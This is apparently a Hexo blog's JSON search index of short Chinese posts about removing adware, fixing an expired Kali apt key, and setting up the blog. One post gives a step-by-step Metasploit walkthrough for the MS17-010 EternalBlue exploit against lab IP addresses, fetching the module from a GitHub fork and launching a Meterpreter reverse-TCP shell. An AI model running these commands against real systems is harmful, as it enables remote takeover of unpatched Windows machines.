在注册表HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows里能找到和流氓软件对应地址的一个注册表项，删除此项，重启，问题解决。","categories":[],"tags":[{"name":"病毒","slug":"病毒","permalink":"http://yoursite.com/tags/病毒/"}]},{"title":"kali更新源问题解决方案","slug":"kali更新源问题解决方案","date":"2018-02-06T04:17:06.000Z","updated":"2019-08-19T03:01:20.656Z","comments":true,"path":"2018/02/06/kali更新源问题解决方案/","link":"","permalink":"http://yoursite.com/2018/02/06/kali更新源问题解决方案/","excerpt":"更换apt源后显示GPG错误 签名无效等问题描述Kali Linux由于太长时间未更新，而出现GPG错误 KEYEXPIRED 1425567400。经检查源未出现问题可以解析，deb也不冲突，就是密钥过期了!","text":"更换apt源后显示GPG错误 签名无效等问题描述Kali Linux由于太长时间未更新，而出现GPG错误 KEYEXPIRED 1425567400。经检查源未出现问题可以解析，deb也不冲突，就是密钥过期了! 解决方法具体更新方法有以下几种方法：（任选一种即可） 1、# apt-key adv --keyserver keys.gnupg.net --recv-keys ED444FF07D8D0BF6 2、# wget -q -O - archive.kali.org/archive-key.asc | apt-key add 3、# gpg --keyserver hkp://pgpkeys.mit.edu --recv-key ED444FF07D8D0BF6 # gpg -a --export ED444FF07D8D0BF6 | sudo apt-key add - 4、# wget https://http.kali.org/kali/pool/ ... ring_2018.1_all.deb # apt install ./kali-archive-keyring_2018.1_all.deb 成功更新密钥之后，我们就可以正常的 update / upgrade 了。 然后在执行1apt-get update 即可。","categories":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"瞎搞的一次ms17-0100漏洞利用","slug":"瞎搞的一次ms17-0100漏洞利用","date":"2018-01-18T02:22:42.000Z","updated":"2019-08-19T03:01:29.009Z","comments":true,"path":"2018/01/18/瞎搞的一次ms17-0100漏洞利用/","link":"","permalink":"http://yoursite.com/2018/01/18/瞎搞的一次ms17-0100漏洞利用/","excerpt":"MS17-010前提条件：gem install ruby_smb—-ruby_smb模块安装msfupdate—-msf的更新msfconsole -qx “useexploit/windows/smb/ms17_010_eternalblue”—-启动并加载模块","text":"MS17-010前提条件：gem install ruby_smb—-ruby_smb模块安装msfupdate—-msf的更新msfconsole -qx “useexploit/windows/smb/ms17_010_eternalblue”—-启动并加载模块 部署环境： msfconsole wget https://raw.githubusercontent.com/backlion/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb cp ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb 开始攻击: msfconsole use exploit/windows/smb/ms17_010_eternalblue set rhost 192.168.21.128 set lhost 192.168.21.131 set payload windows/x64/meterpreter/reverse_tcp exploit shell","categories":[],"tags":[]},{"title":"搭建个人博客","slug":"搭建个人博客","date":"2018-01-16T05:21:52.000Z","updated":"2019-08-19T03:01:36.759Z","comments":true,"path":"2018/01/16/搭建个人博客/","link":"","permalink":"http://yoursite.com/2018/01/16/搭建个人博客/","excerpt":"第一次尝试","text":"第一次尝试 2018/1/16经过两天的尝试，终于成功地在Github上面搭建了博客。","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2018-01-15T14:52:42.245Z","updated":"2018-01-15T14:52:42.245Z","comments":true,"path":"2018/01/15/hello-world/","link":"","permalink":"http://yoursite.com/2018/01/15/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}